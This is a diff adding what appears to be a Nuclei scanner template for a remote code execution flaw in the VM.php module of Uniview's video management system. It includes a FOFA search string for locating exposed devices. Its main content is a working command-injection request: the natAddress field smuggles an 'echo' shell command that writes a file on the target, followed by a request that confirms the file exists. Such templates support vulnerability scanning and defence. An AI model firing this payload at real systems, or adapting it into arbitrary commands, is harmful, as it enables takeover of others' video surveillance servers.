@@ -1,0 +1,36 @@
+id: uniview-vms-vmphp-command-exec
+
+info:
+  name: 浙江宇视视频管理系统 VM.php 模块远程代码执行漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: /Script/Public/Language.js.php
+          浙江宇视科技有限公司（Uniview）作为全球AIoT产品与解决方案提供商，其视频管理系统中VM.php模块存在安全缺陷。攻击者可利用该漏洞在目标系统上执行任意代码，导致系统权限被完全控制。
+  tags: 浙江宇视视频管理系统
+
+http:
+- raw:
+  - |
+    POST /Interface/DevManage/VM.php HTTP/1.1
+    Host: {{Hostname}}
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN
+    Connection: keep-alive
+    Content-Type: application/x-www-form-urlencoded
+    Cookie: PHPSESSID=5b1d2622cb07bac9ec8eedbfa3c42865; logintime=-; devLanguage=zh-CN
+
+    cmd=setNatConfig&natAddress=%26echo%20NdayTest%20>NTest.txt
+- raw:
+  - |
+    GET /Interface/DevManage/NTest.txt HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
